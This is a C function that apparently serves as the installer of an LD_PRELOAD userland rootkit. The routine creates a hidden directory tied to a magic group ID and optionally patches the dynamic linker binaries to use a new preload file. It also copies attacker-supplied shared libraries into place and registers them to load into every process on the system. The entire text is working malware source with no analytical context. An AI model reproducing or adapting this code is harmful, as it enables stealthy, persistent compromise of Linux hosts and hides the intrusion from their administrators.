void bdvinstall(char *const argv[]){
    dorolf();
    printf("Name: \e[1;31m%s\e[0m\n", BD_UNAME);
    printf("Creating installation directory.\n");

    gid_t magicgid = readgid();
    if(preparedir(INSTALL_DIR, magicgid) < 0){
        printf("Something went wrong creating the install directory.\n");
        exit(0);
    }

    char *preloadpath = OLD_PRELOAD;
#ifdef PATCH_DYNAMIC_LINKER
    for(int i = 0; i != LDPATHS_SIZE; i++)
        ldpatch(ldpaths[i], OLD_PRELOAD, PRELOAD_FILE, MAGICUSR);
    preloadpath = PRELOAD_FILE;
#endif

    char *opath, *odup, *npath;
    int cpr, i;

    for(i = 1; argv[i] != NULL; i++){
        if(strstr(argv[i], ".so.")){
            opath = argv[i];
            odup = strdup(opath);
            npath = sogetpath(odup);
            free(odup);

            if(npath == NULL){
                printf("Could not get new path for %s.\n", opath);
                exit(0);
            }

            cpr = socopy(opath, npath, magicgid);
            free(npath);

            if(cpr){
                printf("Copied: \e[1;31m%s\e[0m\n", basename(opath));
                reinstall(preloadpath);
            }else printf("Something went wrong copying \e[1;31m%s\e[0m...\n", opath);
        }else printf("NO\n");
    }

    if(!rknomore() && preloadok(preloadpath))
        printf("Installation finished.\n");
    else
        printf("It seems something may have went wrong...\n");

    exit(0);
}